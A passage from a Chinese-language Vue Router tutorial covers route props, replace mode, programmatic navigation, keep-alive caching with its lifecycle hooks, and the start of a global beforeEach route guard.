<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;props传值：&#123;&#123;id&#125;&#125;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">props: [</span><br><span class="line">	&#x27;id&#x27;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail</code>组件中，可以通过<code>props</code>拿到路由的传值，效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220603211347076.png" alt="image-20220603211347076"></p>
<h4 id="6-4-3-2-props值是布尔值"><a href="#6-4-3-2-props值是布尔值" class="headerlink" title="6.4.3.2.props值是布尔值"></a>6.4.3.2.<code>props</code>值是布尔值</h4><p>前提：<code>&lt;router-link&gt;</code>是以<code>params</code>传参的</p>
<p><code>router/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">        <span class="attr">props</span>: <span class="literal">true</span> <span class="comment">// props值为布尔值，布尔值为true则把路由收到的所有params参数通过props传给Detail组件</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;props传值：&#123;&#123;id&#125;&#125; - &#123;&#123;title&#125;&#125;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">props: [ // 定义的props变量，和params位置参数保持一致</span><br><span class="line">    &#x27;id&#x27;,</span><br><span class="line">    &#x27;title&#x27;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail</code>组件中，可以通过<code>props</code>拿到路由的传值，效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220603211914461.png" alt="image-20220603211914461"></p>
<h4 id="6-4-3-3-props值是函数"><a href="#6-4-3-3-props值是函数" class="headerlink" title="6.4.3.3.props值是函数"></a>6.4.3.3.<code>props</code>值是函数</h4><p><code>router/index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">        <span class="title function_">props</span>(<span class="params"></span>) &#123; <span class="comment">// props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">id</span>: <span class="number">666</span>,</span><br><span class="line">                <span class="attr">title</span>: <span class="string">&#x27;sai&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;props传值：&#123;&#123;id&#125;&#125; - &#123;&#123;title&#125;&#125;&lt;/li&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">props: [ // 定义的props变量，和params位置参数保持一致</span><br><span class="line">    &#x27;id&#x27;,</span><br><span class="line">    &#x27;title&#x27;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>Detail</code>组件中，可以通过<code>props</code>拿到路由的传值，效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220603212510054.png" alt="image-20220603212510054"></p>
<p><code>props</code>的函数形式，会有一个<code>$route</code>参数，就是组件的<code>$route</code>属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">children</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;detail/:id/:title&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">        <span class="title function_">props</span>(<span class="params">$route</span>) &#123; <span class="comment">// props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">            	<span class="attr">id</span>: $route.<span class="property">params</span>.<span class="property">id</span>, <span class="comment">// 或者是$route.query.id，都可以</span></span><br><span class="line">                <span class="attr">title</span>: $route.<span class="property">params</span>.<span class="property">title</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>我们知道，<code>$route</code>是一个对象，可以用对象的解构赋值简写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">props</span>(<span class="params">&#123;params&#125;</span>) &#123; <span class="comment">// 或者是query，取决于传参的方式</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">id</span>: params.<span class="property">id</span>,</span><br><span class="line">        <span class="attr">title</span>: params.<span class="property">title</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>query</code>还是对象，可以用对象解构赋值的连续写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">props</span>(<span class="params">&#123;params: &#123;id ,title&#125;&#125;</span>) &#123; <span class="comment">// 或者是query，取决于传参的方式</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">id</span>: id,</span><br><span class="line">        <span class="attr">title</span>: title</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再使用对象的简写形式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">props</span>(<span class="params">&#123;params: &#123;id ,title&#125;&#125;</span>) &#123; <span class="comment">// 或者是query，取决于传参的方式</span></span><br><span class="line">    <span class="keyword">return</span> &#123;id, title&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="6-4-3-4-小结：路由的props配置"><a href="#6-4-3-4-小结：路由的props配置" class="headerlink" title="6.4.3.4.小结：路由的props配置"></a>6.4.3.4.小结：路由的<code>props</code>配置</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;detail/:id&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Detail</span>,</span><br><span class="line">    <span class="comment">// 第一种写法：props值是对象，该对象中所有key-value的组合最终都会通过props传给Detail组件，Detail组件通过props配置项获取，这样不用引入`$route`了</span></span><br><span class="line">    <span class="comment">// props: &#123;a:900&#125;</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 第二种写法：props值为布尔值，布尔值为true则把路由收到的所有params参数通过props传给Detail组件</span></span><br><span class="line">    <span class="comment">// props: true</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 第三种写法：props值为函数，该函数返回的对象的每一组key-value都会通过props传给Detail组件</span></span><br><span class="line">    <span class="title function_">props</span>(<span class="params">$route</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">id</span>: $route.<span class="property">query</span>.<span class="property">id</span>,</span><br><span class="line">            <span class="attr">title</span>: $route.<span class="property">query</span>.<span class="property">title</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6-4-4-router-link的replace属性"><a href="#6-4-4-router-link的replace属性" class="headerlink" title="6.4.4.router-link的replace属性"></a>6.4.4.<code>router-link</code>的<code>replace</code>属性</h3><p>这一小节，我们关注一下，路由对浏览器历史记录的影响</p>
<p>浏览器使用栈结构来保存历史记录，使用<code>&lt;router-link&gt;</code>相当于<code>push</code>操作，一条一条往栈结构中写数据</p>
<p>还有<code>replace</code>操作，替换掉当前的历史记录</p>
<ul>
<li>作用：控制路由跳转时操作浏览器历史记录的模式</li>
<li>浏览器的历史记录有两种写入方式：分别是<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时默认为<code>push</code></li>
<li>如何开启<code>replace</code>模式：<code>&lt;router-link replace ...&gt;News&lt;/router-link&gt;</code></li>
</ul>
<h2 id="6-5-编程式路由导航"><a href="#6-5-编程式路由导航" class="headerlink" title="6.5.编程式路由导航"></a>6.5.编程式路由导航</h2><h3 id="6-5-1-使用方法实现路由跳转"><a href="#6-5-1-使用方法实现路由跳转" class="headerlink" title="6.5.1.使用方法实现路由跳转"></a>6.5.1.使用方法实现路由跳转</h3><p><code>$router</code>是<code>VueRouter</code>的实例对象，它身上真正有用的方法，是放在原型对象上的</p>
<p><code>push</code>和<code>replace</code>方法同样可以实现路由的跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;Message&lt;/h2&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;</span><br><span class="line">        &lt;!-- &lt;router-link :to=&quot;`/about/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; --&gt;</span><br><span class="line">        &lt;!-- &lt;router-link :to=&quot;&#123;</span><br><span class="line">           name: &#x27;xiangqing&#x27;,</span><br><span class="line">           params: &#123;</span><br><span class="line">               id: m.id,</span><br><span class="line">               title: m.title</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; --&gt;</span><br><span class="line">        &lt;button @click=&quot;showInfo(m)&quot;&gt;click&lt;/button&gt;</span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;Message&quot;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                messageList: [</span><br><span class="line">                    &#123;id:&#x27;001&#x27;,title:&#x27;message 01&#x27;&#125;,</span><br><span class="line">                    &#123;id:&#x27;002&#x27;,title:&#x27;message 02&#x27;&#125;,</span><br><span class="line">                    &#123;id:&#x27;003&#x27;,title:&#x27;message 03&#x27;&#125;,</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">          showInfo(m) &#123;</span><br><span class="line">            this.$router.push(&#123;</span><br><span class="line">                         name: &#x27;xiangqing&#x27;,</span><br><span class="line">           params: &#123;</span><br><span class="line">               id: m.id,</span><br><span class="line">               title: m.title</span><br><span class="line">           &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p><code>back</code>方法对应浏览器的回退，<code>forward</code>方法方法对象浏览器的前进，这两个方法可以操作浏览器的历史记录</p>
<p><code>go</code>方法接收一个数字，如果是正数<code>n</code>，表示往前连续走<code>n</code>步，后退的话用<code>-n</code>表示</p>
<h4 id="路由重复跳转，报redundant-navigation"><a href="#路由重复跳转，报redundant-navigation" class="headerlink" title="路由重复跳转，报redundant navigation"></a>路由重复跳转，报<code>redundant navigation</code></h4><p>解决<code>redundant navigation</code>问题，在<code>router/index.js</code>中重写<code>push</code>和<code>replace</code>方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> originPush = <span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span></span><br><span class="line"><span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span> = <span class="keyword">function</span> (<span class="params">location, resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (resolve &amp;&amp; reject) &#123;</span><br><span class="line">        originPush.<span class="title function_">call</span>(<span class="variable language_">this</span>, location, resolve, reject)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        originPush.<span class="title function_">call</span>(</span><br><span class="line">            <span class="variable language_">this</span>,</span><br><span class="line">            location,</span><br><span class="line">            <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> originReplace = <span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">replace</span></span><br><span class="line"><span class="title class_">VueRouter</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">replace</span> = <span class="keyword">function</span> (<span class="params">location, resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (resolve &amp;&amp; reject) &#123;</span><br><span class="line">        originReplace.<span class="title function_">call</span>(<span class="variable language_">this</span>, location, resolve, reject)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        originReplace.<span class="title function_">call</span>(</span><br><span class="line">            <span class="variable language_">this</span>,</span><br><span class="line">            location,</span><br><span class="line">            <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="样例：三级菜单跳转携带参数"><a href="#样例：三级菜单跳转携带参数" class="headerlink" title="样例：三级菜单跳转携带参数"></a>样例：三级菜单跳转携带参数</h4><p>例一：三级菜单栏的路由跳转，传递不同的参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;categoryname, category1id, category2id, category3id&#125; = event.<span class="property">target</span>.<span class="property">dataset</span></span><br><span class="line"><span class="keyword">if</span>(categoryname) &#123; <span class="comment">// 匹配到a标签</span></span><br><span class="line">  <span class="comment">// 整理路由跳转参数</span></span><br><span class="line">  <span class="keyword">let</span> location = &#123;<span class="attr">name</span>: <span class="string">&#x27;search&#x27;</span>&#125;</span><br><span class="line">  <span class="keyword">let</span> query = &#123;<span class="attr">categoryName</span>: categoryname&#125;</span><br><span class="line">  <span class="keyword">if</span>(category1id) &#123;</span><br><span class="line">    query.<span class="property">category1id</span> = category1id</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(category2id) &#123;</span><br><span class="line">    query.<span class="property">category2id</span> = category2id</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    query.<span class="property">category3id</span> = category3id</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 合并参数</span></span><br><span class="line">  location.<span class="property">query</span> = query</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(location)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用在不同地方的统一组件，在路由跳转时，要明确有没有参数合并的需求，</p>
<ul>
<li><p>因为一个地方可能是<code>query</code>参数，另一个地方可能是<code>params</code>参数</p>
<p><code>A</code>组件用到<code>search</code>组件，是<code>params</code>参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">goSearch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> location = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;search&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      <span class="attr">keyword</span>: <span class="variable language_">this</span>.<span class="property">keyword</span> || <span class="literal">undefined</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>) &#123; </span><br><span class="line">    location.<span class="property">query</span> = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(location)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>B</code>组件也用到<code>search</code>组件，是<code>query</code>参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">goSearch</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;categoryname, category1id, category2id, category3id&#125; = event.<span class="property">target</span>.<span class="property">dataset</span></span><br><span class="line">  <span class="keyword">if</span> (categoryname) </span><br><span class="line">    <span class="keyword">let</span> location = &#123;<span class="attr">name</span>: <span class="string">&#x27;search&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">let</span> query = &#123;<span class="attr">categoryName</span>: categoryname&#125;</span><br><span class="line">    <span class="keyword">if</span> (category1id) &#123;</span><br><span class="line">      query.<span class="property">category1id</span> = category1id</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (category2id) &#123;</span><br><span class="line">      query.<span class="property">category2id</span> = category2id</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      query.<span class="property">category3id</span> = category3id</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 合并参数</span></span><br><span class="line">    location.<span class="property">query</span> = query</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>) &#123;</span><br><span class="line">      location.<span class="property">params</span> = <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(location)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>当<code>A</code>、<code>B</code>两个组件出现在同一页面时，就要考虑先后查询的问题（查询参数是否需要合并）</p>
</li>
</ul>
<h3 id="6-5-2-缓存路由组件"><a href="#6-5-2-缓存路由组件" class="headerlink" title="6.5.2.缓存路由组件"></a>6.5.2.缓存路由组件</h3><p>如果一个组件中，有输入框，切换后组件会销毁，再重新点回去组件会重新渲染，现在希望保留输入框的值</p>
<p>我们需要加一个配置项<code>keep-alive</code>，包裹<code>router-view</code>，那么加在哪个组件里呢？看需求</p>
<p>先给<code>News</code>组件添加<code>input</code></p>
<p><code>News.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们希望在切换<code>News</code>组件和<code>Message</code>组件时，<code>input</code>值仍存在，在这两个组件的父组件中使用<code>keep-alive</code></p>
<p><code>About.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/about/news&quot;&gt;news&lt;/router-link&gt;&lt;br/&gt;</span><br><span class="line">&lt;router-link to=&quot;/about/message&quot;&gt;message&lt;/router-link&gt;</span><br><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure>

<p>此时<code>News</code>组件和<code>Mesage</code>组件在切换时就都不会被销毁了</p>
<p>如果只想缓存<code>News</code>组件，可以使用<code>include</code>配置项，值为组件中的<code>name</code>配置项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive inclue=&quot;News&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure>

<p>如果是缓存多个组件，可以使用数组写法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive :inclue= &quot;[&#x27;News&#x27;, &#x27;Message&#x27;]&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure>

<p>注意：如果两个路由组件中，用到了一个公共的组件，而这个公共组件又请求了服务器数据，那么这两个路由组件在来回切换时，就会不断重复的发请求，因为路由组件会不断的销毁创建</p>
<p>一般这种情况会把发送请求的放在<code>App</code>组件中，不会用<code>keep-alive</code>的，这是个误区，你用<code>keep-alive</code>至少还是会发两次请求。</p>
<h3 id="6-5-3-两个新的生命周期钩子"><a href="#6-5-3-两个新的生命周期钩子" class="headerlink" title="6.5.3.两个新的生命周期钩子"></a>6.5.3.两个新的生命周期钩子</h3><p>如果被缓存的组件，需要做销毁定时器的操作，那么不能在<code>beforeDestroy</code>生命周期中编写代码</p>
<ul>
<li><p><code>activated</code></p>
<ul>
<li>被缓存的组件激活了</li>
</ul>
</li>
<li><p><code>deactivated</code></p>
<ul>
<li>被缓存的组件失活了</li>
</ul>
</li>
</ul>
<h3 id="6-5-4-全局前置-路由守卫"><a href="#6-5-4-全局前置-路由守卫" class="headerlink" title="6.5.4.全局前置_路由守卫"></a>6.5.4.全局前置_路由守卫</h3><p>这是一个权限的问题，每次路由切换的时候，都要做一个校验</p>
<p>怎么做这个校验呢？</p>
<p><code>router/index.js</code>暴露<code>VueRouter</code>实例之前，给其加一个前置路由守卫，即调用该实例对象上的<code>beforeEach</code>方法</p>
<p>调用时机：</p>
<ul>
<li>初始化的时候被调用</li>
<li>每次路由切换之前被调用</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">    <span class="attr">routes</span>: [...]</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 全局前置路由守卫</span></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;abcd&#x27;</span>) </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span 